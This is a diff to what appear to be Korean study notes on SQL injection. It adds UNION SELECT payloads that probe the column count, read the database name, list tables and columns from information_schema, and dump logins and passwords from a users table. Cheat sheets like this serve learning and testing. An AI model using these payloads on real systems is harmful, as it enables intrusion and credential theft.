@@ -24,6 +24,11 @@ category:
 
 - `0' union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#`
 - `0' union select all 1,2,3,4,5 #` 
+- `' union select all 1,2,3,4,5,6,7,8,9,10,11#`
+- `' union select all 1,2,database(),4,5,6,7#`
+- `' union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#`
+- `' union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name='users'#`
+- `' order by 10#` : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다
 
 UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. 
 
